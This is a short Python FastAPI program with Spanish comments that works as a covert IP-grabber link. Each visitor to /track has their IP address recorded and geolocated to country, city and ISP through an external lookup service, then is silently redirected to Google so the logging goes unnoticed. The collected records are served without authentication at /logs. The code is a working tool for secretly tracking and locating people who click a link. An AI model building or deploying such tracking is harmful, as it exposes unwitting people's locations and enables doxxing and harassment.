from fastapi import FastAPI, Request
from fastapi.responses import RedirectResponse, PlainTextResponse
from datetime import datetime
import os
import httpx

app = FastAPI()
LOG_FILE = "ip_logs.txt"

# Asegura que el archivo exista desde el arranque
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding="utf-8") as f:
        f.write("Fecha y hora | IP | País | Ciudad | ISP\n")

@app.get("/")
def root():
    return RedirectResponse("/track")

@app.get("/track")
async def track(request: Request):
    # Intenta obtener la IP real del visitante (encabezado o conexión directa)
    x_forwarded_for = request.headers.get('X-Forwarded-For')
    ip = x_forwarded_for.split(',')[0] if x_forwarded_for else request.client.host
    
    # Consulta información geográfica
    info = {"country": "Desconocido", "city": "Desconocido", "isp": "Desconocido"}
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get(f"http://ip-api.com/json/{ip}")
            data = r.json()
            if data["status"] == "success":
                info["country"] = data["country"]
                info["city"] = data["city"]
                info["isp"] = data["isp"]
    except Exception as e:
        print(f"Error al obtener información geográfica: {e}")
    
    # Prepara la información para logging
    timestamp = datetime.now().isoformat()
    log_line = f"{timestamp} | IP: {ip} | Country: {info['country']} | City: {info['city']} | ISP: {info['isp']}\n"
    
    # Guarda la información en el archivo
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(log_line)
    
    # Muestra la información en consola
    print("=" * 80)
    print("NUEVO VISITANTE DETECTADO:")
    print(f"Timestamp: {timestamp}")
    print(f"IP: {ip}")
    print(f"País: {info['country']}")
    print(f"Ciudad: {info['city']}")
    print(f"ISP: {info['isp']}")
    print("=" * 80)
    
    return RedirectResponse("https://www.google.com")

@app.get("/logs", response_class=PlainTextResponse)
def get_logs():
    try:
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        return "El archivo de logs no existe aún."